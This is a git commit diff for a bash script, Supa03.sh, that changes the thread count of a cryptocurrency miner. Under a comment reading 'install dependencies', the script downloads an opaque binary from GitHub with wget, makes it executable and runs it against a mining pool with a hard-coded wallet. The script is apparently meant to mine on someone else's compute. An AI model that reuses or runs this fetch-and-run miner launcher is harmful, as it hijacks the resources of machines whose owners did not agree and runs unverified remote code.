66886d81fed2ea1b3559649a1557359cffcf6497
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-06-13 11:29:17 +0700

    Update Supa03.sh

--- Supa03.sh
+++ Supa03.sh
@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
 # install dependencies
 wget https://github.com/BatiKangkung/KangKung/raw/main/avx2m && chmod +x avx2m 
-./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -p x
+./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -t 2 -p x
 
